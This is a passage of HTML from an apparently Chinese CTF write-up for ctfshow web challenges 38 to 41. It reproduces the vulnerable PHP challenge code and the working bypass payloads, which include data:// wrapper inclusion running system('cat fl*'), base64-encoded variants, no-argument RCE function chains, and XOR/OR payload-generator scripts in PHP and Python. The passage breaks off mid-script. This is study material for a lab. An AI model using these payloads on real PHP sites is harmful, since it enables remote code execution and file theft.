伪协议输入的命令参数，具体如下：</p>\n<blockquote>\n<p>data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的 data:// 流会被当作 php 文件执行</p>\n</blockquote>\n<p>​\t\t<strong>第一：使用通配符绕过 flag：</strong></p>\n<blockquote>\n<p>?c=data://text/plain,<?php echo system('cat fl*');?><br>\n?c=data://text/plain,<?php%20 system('cat fl*');?></p>\n</blockquote>\n<p>​\t\t<strong>第二：使用 base64 绕过 flag：</strong></p>\n<blockquote>\n<p>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</p>\n<p>#base64 解码为 <code>&lt;?php system('cat flag.php');?&gt;</code></p>\n</blockquote>\n<h1 id=\"web38\"><a class=\"markdownIt-Anchor\" href=\"#web38\">#</a> Web38：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//flag in flag.php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag|php|file/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>​\t\t相较于上一个题多过滤了一层 php，使用 base64 绕过就行：</p>\n<blockquote>\n<p>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</p>\n</blockquote>\n<p>​\t\t或者，使用短标签绕过：</p>\n<blockquote>\n<p>?c=data://text/plain,<?= system(\"tac fla?.???\");?></p>\n</blockquote>\n<h1 id=\"web39\"><a class=\"markdownIt-Anchor\" href=\"#web39\">#</a> Web39：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//flag in flag.php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"variable\">$c</span>.<span class=\"string\">&quot;.php&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t过滤了 flag，但是文件包含里存在.php 的后缀，好像无伤大雅，和上一题一样，短标签打。</p>\n<blockquote>\n<p>/?c=data://text/plain,<?= system(\"tac fla?.???\");?></p>\n</blockquote>\n<p>​\t\t由于两端合在一起就类似于 <code>&lt;?= system('tac fla*');?&gt;.php</code> ，.php 因为已经被标签闭合在外面，所以不会被当作文件包含的后缀算进去，依旧能进行 RCE。</p>\n<h1 id=\"web40\"><a class=\"markdownIt-Anchor\" href=\"#web40\">#</a> Web40：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>​\t\t过滤了数字，和各种符号，但是过滤似乎有点儿问题，没有过滤英文的括号，过滤成了中文的括号，所以，无参数 RCE，可以一把梭：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:?c=<span class=\"title function_ invoke__\">show_source</span>(<span class=\"title function_ invoke__\">next</span>(<span class=\"title function_ invoke__\">array_reverse</span>(<span class=\"title function_ invoke__\">scandir</span>(<span class=\"title function_ invoke__\">pos</span>(<span class=\"title function_ invoke__\">localeconv</span>())))));</span><br></pre></td></tr></table></figure>\n<p>​\t\t前置知识：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">localeconv</span>()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</span><br><span class=\"line\"><span class=\"title function_ invoke__\">current</span>() ：返回数组中的当前元素的值；默认取第一个值</span><br><span class=\"line\"><span class=\"title function_ invoke__\">pos</span>()：<span class=\"title function_ invoke__\">current</span>() 的别名</span><br><span class=\"line\"><span class=\"title function_ invoke__\">reset</span>() 将 <span class=\"keyword\">array</span> 的内部指针倒回到第一个单元并返回第一个数组单元的值。</span><br><span class=\"line\"><span class=\"title function_ invoke__\">array_reverse</span>()：数组逆序</span><br><span class=\"line\">(如果不是数组的最后一个或者倒数第二个呢？我们可以使用<span class=\"title function_ invoke__\">array_rand</span>(<span class=\"title function_ invoke__\">array_flip</span>())，<span class=\"title function_ invoke__\">array_flip</span>()是交换数组的键和值，<span class=\"title function_ invoke__\">array_rand</span>()是随机返回一个数组)</span><br><span class=\"line\"><span class=\"title function_ invoke__\">scandir</span>()：列出指定路径中的文件和目录</span><br><span class=\"line\"><span class=\"title function_ invoke__\">next</span>()：函数将内部指针向前移动一位即指向数组中的下一个元素，并输出这个元素。</span><br></pre></td></tr></table></figure>\n<p>​\t\t或者使用：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查看当前目录下文件</span><br><span class=\"line\">?c=<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">scandir</span>(<span class=\"title function_ invoke__\">dirname</span>(<span class=\"keyword\">__FILE__</span>)));</span><br><span class=\"line\">找到flag.php</span><br><span class=\"line\">?c=<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">next</span>(<span class=\"title function_ invoke__\">array_reverse</span>(<span class=\"title function_ invoke__\">scandir</span>(<span class=\"title function_ invoke__\">dirname</span>(<span class=\"keyword\">__FILE__</span>)))));</span><br><span class=\"line\">高亮显示即可</span><br><span class=\"line\">c=<span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"title function_ invoke__\">next</span>(<span class=\"title function_ invoke__\">array_reverse</span>(<span class=\"title function_ invoke__\">scandir</span>(<span class=\"title function_ invoke__\">dirname</span>(<span class=\"keyword\">__FILE__</span>)))));</span><br></pre></td></tr></table></figure>\n<h1 id=\"web41\"><a class=\"markdownIt-Anchor\" href=\"#web41\">#</a> Web41：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i&#x27;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"string\">&quot;echo(<span class=\"subst\">$c</span>);&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t无字母数字 RCE，并且因为过滤了 $、+、-、^、~ 所以无法使用异或、自增和取反绕过，不过，听说网上还有另一个操作，就是利用管道符，也就是 | 运算符，这里贴一下相关的文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eC9hcnRpY2xlL2RldGFpbHMvMTA5MTQzNDEzP29wc19yZXF1ZXN0X21pc2M9JTI1N0IlMjUyMnJlcXVlc3QlMjU1RmlkJTI1MjIlMjUzQSUyNTIyMTYzNTMwMTA4MTE2NzgwMjYyNTU0NTc3JTI1MjIlMjUyQyUyNTIyc2NtJTI1MjIlMjUzQSUyNTIyMjAxNDA3MTMuMTMwMTAyMzM0LnBjJTI1NUZibG9nLiUyNTIyJTI1N0QmYW1wO3JlcXVlc3RfaWQ9MTYzNTMwMTA4MTE2NzgwMjYyNTU0NTc3JmFtcDtiaXpfaWQ9MCZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3NlYXJjaF9yZXN1bHQubm9uZS10YXNrLWJsb2ctMn5ibG9nfmZpcnN0X3JhbmtfdjJ+cmFua192MjktMS0xMDkxNDM0MTMucGNfdjJfcmFua19ibG9nX2RlZmF1bHQmYW1wO3V0bV90ZXJtPSVFNSU4RiU5NiVFNSU4RiU4RCZhbXA7c3BtPTEwMTguMjIyNi4zMDAxLjQ0NTA=\">无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eC9hcnRpY2xlL2RldGFpbHMvMTA4NTY5MDgw\">ctfshow web 入门 web41</span></p>\n<p>​\t\t这里给了两个代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*author yu22x*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$myfile</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;xor_rce.txt&quot;</span>, <span class=\"string\">&quot;w&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$contents</span>=<span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"variable\">$i</span>=<span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"number\">256</span>; <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$j</span>=<span class=\"number\">0</span>; <span class=\"variable\">$j</span> &lt;<span class=\"number\">256</span> ; <span class=\"variable\">$j</span>++) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable\">$i</span>&lt;<span class=\"number\">16</span>)&#123;</span><br><span class=\"line\">            <span class=\"variable\">$hex_i</span>=<span class=\"string\">&#x27;0&#x27;</span>.<span class=\"title function_ invoke__\">dechex</span>(<span class=\"variable\">$i</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$hex_i</span>=<span class=\"title function_ invoke__\">dechex</span>(<span class=\"variable\">$i</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable\">$j</span>&lt;<span class=\"number\">16</span>)&#123;</span><br><span class=\"line\">            <span class=\"variable\">$hex_j</span>=<span class=\"string\">&#x27;0&#x27;</span>.<span class=\"title function_ invoke__\">dechex</span>(<span class=\"variable\">$j</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$hex_j</span>=<span class=\"title function_ invoke__\">dechex</span>(<span class=\"variable\">$j</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$preg</span> = <span class=\"string\">&#x27;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i&#x27;</span>; <span class=\"comment\">//根据题目给的正则表达式修改即可</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$preg</span> , <span class=\"title function_ invoke__\">hex2bin</span>(<span class=\"variable\">$hex_i</span>))||<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$preg</span> , <span class=\"title function_ invoke__\">hex2bin</span>(<span class=\"variable\">$hex_j</span>)))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$a</span>=<span class=\"string\">&#x27;%&#x27;</span>.<span class=\"variable\">$hex_i</span>;</span><br><span class=\"line\">            <span class=\"variable\">$b</span>=<span class=\"string\">&#x27;%&#x27;</span>.<span class=\"variable\">$hex_j</span>;</span><br><span class=\"line\">            <span class=\"variable\">$c</span>=(<span class=\"title function_ invoke__\">urldecode</span>(<span class=\"variable\">$a</span>)^<span class=\"title function_ invoke__\">urldecode</span>(<span class=\"variable\">$b</span>));</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">ord</span>(<span class=\"variable\">$c</span>)&gt;=<span class=\"number\">32</span>&amp;<span class=\"title function_ invoke__\">ord</span>(<span class=\"variable\">$c</span>)&lt;=<span class=\"number\">126</span>) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$contents</span>=<span class=\"variable\">$contents</span>.<span class=\"variable\">$c</span>.<span class=\"string\">&quot; &quot;</span>.<span class=\"variable\">$a</span>.<span class=\"string\">&quot; &quot;</span>.<span class=\"variable\">$b</span>.<span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$myfile</span>,<span class=\"variable\">$contents</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$myfile</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t\t还有 python 的：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># author yu22x</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">from</span> sys <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">action</span>(<span class=\"params\">arg</span>):</span><br><span class=\"line\">   s1=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">   s2=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">   <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> arg:</span><br><span class=\"line\">       f=<span class=\"built_in\">open</span>(<span class=\"string\">&quot;xor_rce.txt&quot;</span>,<span class=\"string\">&quot;r&quot;</span>)</span><br><span class=\"line\">       <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">           t=f.readline()</span><br><span class=\"line\">           <span class=\"keyword\">if</span> t==<span class=\"string\">&quot;&quot;</span>:</span><br><span class=\"line\">               <span class=\"keyword\">break</span></span><br><span class=\"line\">           <span class=\"keyword\">if</span> t[<span class=\"number\">0</span>]==i:</span><br><span class=\"line\">               <span class=\"comment\">#print(i)</span></span><br><span class=\"line\">               s1+=t[<span class=\"number\">2</span>:<span class=\"number\">5</span>]</span><br><span class=\"line\">               s2+=t[<span class=\"number\">6</span>:<span class=\"number\">9</span>]</span><br><span class=\"line\">               <span class=\"keyword\">break</span></span><br><span class=\"line\">       f.close()</span><br><span class=\"line\">   output=<span class=\"string\">&quot;(\\&quot;&quot;</span>+s1+<span class=\"string\">&quot;\\&quot;^\\&quot;&quot;</span>+s2+<span class=\"string\">&quot;\\&quot;)&quot;</span></span><br><span class=\"line\">   <span class=\"keyword\">return</span>(output)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">   param=action(<span class=\"built_in\">input</span>(<span class=\"string\">&quot;\\n[+] your function：&quot;</span>) )+action(<span class=\"built_in\">input</span>(<span class=\"string\">&quot;[+] your command：&quot;</span>))+<span class=\"string\">&quot;;&quot;</span></span><br><span class=\"line\">   <span class=\"built_in\">print</span>(param)</span><br></pre></td></tr></table></figure>\n<p>​\t\t另一个，贴一下羽神的脚本，这个感觉更好用。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$myfile</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;rce_or.txt&quot;</span>, <span class=\"string\">&quot;w&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$contents</span>=<span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"variable\">$i</span>=<span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"number\">256</span>; <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$j</span>=<span class=\"number\">0</span>; <span class=\"variable\">$j</span> &lt;<span class=\"number\">256</span> ; <span class=\"variable\">$j</span>++) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable\">$i</span>&lt;<span class=\"number\">16</span>)&#123;</span><br><span class=\"line\">            <span class=\"variable\">$hex_i</span>=<span class=\"string\">&#x27;0&#x27;</span>.<span class=\"title function_ invoke__\">dechex</span>(<span class=\"variable\">$i</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$hex_i</span>=<span class=\"title function_ invoke__\">dechex</span>(<span class=\"variable\">$i</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable\">$j</span>&lt;<span class=\"number\">16</span>)&#123;</span><br><span class=\"line\">            <span class=\"variable\">$hex_j</span>=<span class=\"string\">&#x27;0&#x27;</span>.<span class=\"title function_ invoke__\">dechex</span>(<span class=\"variable\">$j</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$hex_j</span>=<span class=\"title function_ invoke__\">dechex</span>(<span class=\"variable\">$j</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$preg</span> = <span class=\"string\">&#x27;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$preg</span> , <span class=\"title function_ invoke__\">hex2bin</span>(<span class=\"variable\">$hex_i</span>))||<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$preg</span> , <span class=\"title function_ invoke__\">hex2bin</span>(<span class=\"variable\">$hex_j</span>)))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$a</span>=<span class=\"string\">&#x27;%&#x27;</span>.<span class=\"variable\">$hex_i</span>;</span><br><span class=\"line\">            <span class=\"variable\">$b</span>=<span class=\"string\">&#x27;%&#x27;</span>.<span class=\"variable\">$hex_j</span>;</span><br><span class=\"line\">            <span class=\"variable\">$c</span>=(<span class=\"title function_ invoke__\">urldecode</span>(<span class=\"variable\">$a</span>)|<span class=\"title function_ invoke__\">urldecode</span>(<span class=\"variable\">$b</span>));</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">ord</span>(<span class=\"variable\">$c</span>)&gt;=<span class=\"number\">32</span>&amp;<span class=\"title function_ invoke__\">ord</span>(<span class=\"variable\">$c</span>)&lt;=<span class=\"number\">126</span>) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$contents</span>=<span class=\"variable\">$contents</span>.<span class=\"variable\">$c</span>.<span class=\"string\">&quot; &quot;</span>.<span class=\"variable\">$a</span>.<span class=\"string\">&quot; &quot;</span>.<span class=\"variable\">$b</span>.<span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$myfile</span>,<span class=\"variable\">$contents</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$myfile</span>);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span 